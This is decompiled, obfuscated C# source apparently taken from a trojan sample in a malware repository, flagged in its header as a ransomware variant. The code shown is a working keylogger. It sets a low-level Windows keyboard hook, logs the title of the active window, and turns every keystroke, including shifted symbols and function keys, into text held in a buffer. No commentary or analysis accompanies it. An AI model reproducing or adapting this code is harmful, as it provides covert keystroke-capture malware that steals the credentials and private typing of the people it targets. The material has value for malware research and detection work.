// Decompiled with JetBrains decompiler
// Type: .
// Assembly: msn, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C3204E8B-C6C9-4864-AB4A-50B3E5132C84
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-57375c6c5fdf5cb633258ada4e91cf8f7605a4cb97903a0ea974e04b7dacd954.exe

using \u0006;
using \u000E;
using \u000E\u0006;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u0019\u001C
  {
    private string \u0001;
    private static IntPtr \u0002 = (IntPtr) 0;
    private static string \u0003 = \u0008.\u0007(235);
    private static \u0019\u001C.\u009C\u0003 \u0004 = (\u0019\u001C.\u009C\u0003) null;

    public static string \u0017\u001C([In] IntPtr obj0)
    {
      string str;
      try
      {
        if (obj0.ToInt32() <= 0)
        {
          str = (string) null;
        }
        else
        {
          int num = \u0019\u001C.\u0099\u0003(obj0);
          if (num == 0)
          {
            str = (string) null;
          }
          else
          {
            StringBuilder stringBuilder = new StringBuilder(checked (num + 1));
            \u0019\u001C.\u0098\u0003((int) obj0, stringBuilder, stringBuilder.Capacity);
            str = stringBuilder.ToString().Trim();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static void \u0018\u001C()
    {
      try
      {
        \u0019\u001C.\u0004 = new \u0019\u001C.\u009C\u0003(\u0019\u001C.\u0007\u000F);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0019\u001C.\u0002 = (IntPtr) \u0019\u001C.\u0095\u0003(13, \u0019\u001C.\u0004, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0095\u0003(
      [In] int obj0,
      [In] \u0019\u001C.\u009C\u0003 obj1,
      [In] int obj2,
      [In] int obj3);

    public static int \u0007\u000F([In] int obj0, [In] int obj1, [In] ref \u0019\u001C.\u001A\u001C obj2)
    {
      try
      {
        string Left = \u0019\u001C.\u0017\u001C(\u0019\u001C.\u0097\u0003());
        if (Operators.CompareString(Left, \u0019\u001C.\u0003, false) != 0)
        {
          \u0019\u001C.\u0003 = Left;
          \u0013\u001C.\u0012 = \u0013\u001C.\u0012 + Environment.NewLine + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1712), \u0008.\u0007(285)) + \u0008.\u0007(1246) + Left + \u0008.\u0007(1246) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1777), \u0008.\u0007(285)) + Environment.NewLine + Environment.NewLine;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread.Sleep(10);
        string str = \u0008.\u0007(235);
        if (obj1 == 256 | obj1 == 260)
        {
          switch (obj2.\u0001)
          {
            case 8:
              \u0013\u001C.\u0012 = \u0013\u001C.\u0012.Substring(0, checked (\u0013\u001C.\u0012.Length - 1));
              break;
            case 9:
              str = char.ConvertFromUtf32(9);
              break;
            case 13:
              str = Environment.NewLine;
              break;
            case 16:
            case 160:
            case 161:
              str = \u0008.\u0007(235);
              break;
            case 18:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2316), \u0008.\u0007(285));
              break;
            case 20:
              str = !Control.IsKeyLocked(Keys.Capital) ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2084), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2051), \u0008.\u0007(285));
              break;
            case 27:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2034), \u0008.\u0007(285));
              break;
            case 32:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1966), \u0008.\u0007(285));
              break;
            case 33:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2351), \u0008.\u0007(285));
              break;
            case 34:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2376), \u0008.\u0007(285));
              break;
            case 35:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2485), \u0008.\u0007(285));
              break;
            case 36:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2468), \u0008.\u0007(285));
              break;
            case 37:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1940), \u0008.\u0007(285));
              break;
            case 38:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1953), \u0008.\u0007(285));
              break;
            case 39:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1914), \u0008.\u0007(285));
              break;
            case 40:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1927), \u0008.\u0007(285));
              break;
            case 46:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2017), \u0008.\u0007(285));
              break;
            case 48:
            case 49:
            case 50:
            case 51:
            case 52:
            case 53:
            case 54:
            case 55:
            case 56:
            case 57:
              if (\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown)
              {
                string[] strArray = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1842), \u0008.\u0007(285)).Split(Conversions.ToChar(\u0016\u001C.\u0014\u001C(\u0008.\u0007(1883), \u0008.\u0007(285))));
                switch (obj2.\u0001)
                {
                  case 48:
                    str = strArray[9];
                    break;
                  case 49:
                    str = strArray[0];
                    break;
                  case 50:
                    str = strArray[1];
                    break;
                  case 51:
                    str = strArray[2];
                    break;
                  case 52:
                    str = strArray[3];
                    break;
                  case 53:
                    str = strArray[4];
                    break;
                  case 54:
                    str = strArray[5];
                    break;
                  case 55:
                    str = strArray[6];
                    break;
                  case 56:
                    str = strArray[7];
                    break;
                  case 57:
                    str = strArray[8];
                    break;
                }
              }
              else
              {
                str = char.ConvertFromUtf32(obj2.\u0001);
                break;
              }
              break;
            case 65:
            case 66:
            case 67:
            case 68:
            case 69:
            case 70:
            case 71:
            case 72:
            case 73:
            case 74:
            case 75:
            case 76:
            case 77:
            case 78:
            case 79:
            case 80:
            case 81:
            case 82:
            case 83:
            case 84:
            case 85:
            case 86:
            case 87:
            case 88:
            case 89:
            case 90:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (obj2.\u0001 + 32)).ToLower() : char.ConvertFromUtf32(checked (obj2.\u0001 + 32)).ToUpper();
              break;
            case 91:
            case 92:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2287), \u0008.\u0007(285));
              break;
            case 112:
            case 113:
            case 114:
            case 115:
            case 116:
            case 117:
            case 118:
            case 119:
            case 120:
            case 121:
            case 122:
            case 123:
            case 124:
            case 125:
            case 126:
            case (int) sbyte.MaxValue:
            case 128:
            case 129:
            case 130:
            case 131:
            case 132:
            case 133:
            case 134:
            case 135:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1892), \u0008.\u0007(285)) + Conversions.ToString(checked (obj2.\u0001 - 111)) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1905), \u0008.\u0007(285));
              break;
            case 144:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.NumLock ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2240), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2207), \u0008.\u0007(285));
              break;
            case 162:
            case 163:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1975), \u0008.\u0007(285));
              break;
            case 164:
            case 165:
              str = \u0016\u001C.\u0014\u001C(\u0008.\u0007(2000), \u0008.\u0007(285));
              break;
            case 186:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2432), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2423), \u0008.\u0007(285));
              break;
            case 187:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2198), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2189), \u0008.\u0007(285));
              break;
            case 188:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2162), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2153), \u0008.\u0007(285));
              break;
            case 189:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2144), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2135), \u0008.\u0007(285));
              break;
            case 190:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2180), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2171), \u0008.\u0007(285));
              break;
            case 191:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(1122), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2459), \u0008.\u0007(285));
              break;
            case 192:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2126), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2117), \u0008.\u0007(285));
              break;
            case 219:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2278), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2269), \u0008.\u0007(285));
              break;
            case 220:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2414), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2405), \u0008.\u0007(285));
              break;
            case 221:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2342), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2333), \u0008.\u0007(285));
              break;
            case 222:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0016\u001C.\u0014\u001C(\u0008.\u0007(2450), \u0008.\u0007(285)) : \u0016\u001C.\u0014\u001C(\u0008.\u0007(2441), \u0008.\u0007(285));
              break;
            default:
              str = char.ConvertFromUtf32(obj2.\u0001);
              break;
          }
          \u0013\u001C.\u0012 += str;
          \u0013\u001C.\u007F = \u0013\u001C.\u0012;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num;
      return num;
    }

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
    public static extern IntPtr \u0097\u0003();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int \u0099\u0003([In] IntPtr obj0);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u0098\u0003([In] int obj0, [In] StringBuilder obj1, [In] int obj2);

    public \u0019\u001C([In] string obj0)
    {
      try
      {
        this.\u0001 = obj0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private delegate int \u009C\u0003([In] int obj0, [In] int obj1, [In] ref \u0019\u001C.\u001A\u001C obj2);

    public struct \u001A\u001C
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
    }
  }
}
